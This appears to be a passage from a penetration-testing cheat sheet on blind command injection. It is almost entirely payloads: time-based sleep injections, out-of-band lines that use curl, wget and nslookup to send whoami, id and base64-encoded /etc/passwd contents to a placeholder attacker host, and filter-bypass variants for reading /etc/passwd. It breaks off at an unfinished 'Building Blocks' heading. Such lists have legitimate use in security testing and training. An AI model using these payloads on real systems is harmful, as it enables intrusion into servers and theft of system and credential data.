```

### Common Blind Command Injection Techniques

**Time-based:**
```
; sleep 5
| sleep 5
|| sleep 5
& sleep 5 &
$(sleep 5)
`sleep 5`
```

**Out-of-band (DNS):**
```
; nslookup $(whoami).{ATTACKER_URL}
| curl http://{ATTACKER_URL}/$(whoami)
|| wget http://{ATTACKER_URL}/?d=$(cat /etc/passwd | base64)
```

**Out-of-band (HTTP):**
```
; curl http://{ATTACKER_URL}/exfil?data=$(cat /etc/passwd | base64)
| wget -q -O- http://{ATTACKER_URL}/$(id)
```

### Filter Bypass Combinations

**When semicolon is blocked:**
```
%0a command    (newline)
| command      (pipe)
|| command     (or)
$(command)     (subshell)
`command`      (backtick)
```

**When spaces are blocked:**
```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**When keywords are blocked:**
```
c'a't /etc/passwd
c""at /etc/passwd
/???/c?t /etc/passwd
$(echo Y2F0|base64 -d) /etc/passwd
```

### Building Blocks Approach

```
COMMAND INJECTION BUILDING BLOCKS:
